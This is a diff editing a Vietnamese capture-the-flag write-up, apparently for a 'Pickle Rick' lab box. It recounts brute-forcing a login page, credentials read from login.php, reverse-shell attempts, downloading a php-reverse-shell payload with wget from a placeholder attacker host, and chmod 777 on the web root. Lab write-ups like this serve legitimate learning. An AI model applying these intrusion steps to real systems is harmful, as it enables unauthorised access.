@@ -27,8 +27,8 @@
 - Mình đã xem file config ssh bằng `less /etc/ssh/sshd_config` và thấy dòng `PasswordAuthentication no` -> không thể đăng nhập ssh bằng mật khẩu.
 - Mình thử brute force trang login.php với các từ khóa liên quan đến rabbit hole, rick, root, ubuntu,... nhưng cũng không thành công.
 - Sau đó mình dùng `less login.php` mới thấy chỉ authen tài khoản `R1ckRul3s` và mật khẩu `Wubbalubbadubdub`. 
-- Về mãi sau, khi tìm đủ 3 flag, mình search `rabbit hole in linux`, mới hiểu có vẻ như đó là 1 hint để xem nội dung file bằng các câu lệnh khác (nhưng trên thực tế mình cũng không dùng đến rabbit hole). Hoặc đó là 1 cú lừa, btw ~~.
-- Mình thử dùng netcat để tại reverse shell nhưng không thành công. Sau đó, mình mở http server ở local và dùng `wget <LHOST> <LPORT> php-reverse-shell.php` để upload payload lên host. Ở local báo file đã được get thành công nhưng check trên server mình lại không thấy. Có thể không được phép chỉnh sửa hay tạo file trong folder này.
+- Về mãi sau, khi tìm đủ 3 flag, mình search `rabbit hole in linux`, mới hiểu có vẻ như đó là 1 hint để xem nội dung file bằng các câu lệnh khác (nhưng trên thực tế mình cũng không dùng đến rabbit hole). Hoặc đó là 1 cú lừa ~~.
+- Mình thử dùng netcat để tạo reverse shell và cả php-reverse-shell-payload nhưng đều không thành công. Sau đó, mình mở http server ở local và dùng `wget <LHOST> <LPORT> php-reverse-shell.php` để upload payload lên host. Ở local báo file đã được get thành công nhưng check trên server mình lại không thấy. Có thể không được phép chỉnh sửa hay tạo file trong folder này.
 - Mình thử touch 1 file bất kỳ nhưng không được.
 - Dùng `sudo chmod 777 /var/www/html` và upload payload lại thì lại được.
 - Dùng thêm `sudo chmod 777 php-reverse-shell.php` cho chắc.
